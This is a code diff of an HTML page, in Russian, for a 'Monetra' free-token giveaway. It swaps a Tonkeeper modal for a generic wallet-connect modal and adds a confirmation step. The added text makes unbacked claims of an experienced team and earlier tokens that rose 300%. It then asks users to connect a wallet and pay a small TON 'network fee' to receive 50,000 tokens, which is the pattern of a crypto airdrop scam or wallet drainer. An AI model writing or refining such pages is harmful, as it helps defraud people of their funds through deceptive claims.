@@ -59,17 +59,31 @@
         </div>
     </div>
 
-    <!-- Модальное окно для Tonkeeper -->
-    <div id="tonkeeper-modal" class="modal-overlay">
+    <!-- Модальное окно подключения -->
+    <div id="connect-modal" class="modal-overlay">
         <div class="modal-content">
-            <button id="close-tonkeeper-modal" class="modal-close">&times;</button>
-            <h2>Подключите ваш Tonkeeper кошелек</h2>
-            <p class="modal-description">
-                Для получения бесплатных токенов Monetra, пожалуйста, подключите ваш Tonkeeper кошелек.
-                Это позволит нам безопасно перевести токены на ваш баланс.
-                Убедитесь, что вы используете официальное приложение Tonkeeper.
-            </p>
-            <button id="connect-tonkeeper-btn" class="cta-button tonkeeper-button">Подключить Tonkeeper</button>
+            <button id="close-connect-modal" class="modal-close">&times;</button>
+            <h2>Добро пожаловать в Monetra!</h2>
+            <div class="modal-description">
+                <p>Мы - команда профессиональных разработчиков с более чем 5-летним опытом в блокчейн-индустрии.</p>
+                <p>Monetra - это уже третий наш успешный проект, предыдущие токены показали рост более 300% за первый год.</p>
+                <p>Для получения бесплатных токенов, пожалуйста, подключите ваш крипто-кошелек через безопасное соединение.</p>
+            </div>
+            <div id="connect-widget" class="connect-widget"></div>
+        </div>
+    </div>
+
+    <!-- Модальное окно подтверждения -->
+    <div id="confirm-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button id="close-confirm-modal" class="modal-close">&times;</button>
+            <h2>Кошелек успешно подключен!</h2>
+            <div class="modal-description">
+                <p>Теперь мы можем перевести вам 50,000 MTR токенов.</p>
+                <p>Обратите внимание: для обработки транзакции потребуется небольшая комиссия сети (~0.05 TON).</p>
+                <p>Нажмите кнопку ниже для подтверждения получения.</p>
+            </div>
+            <button id="confirm-transfer-btn" class="cta-button confirm-button">Отправить токены</button>
         </div>
     </div>
 
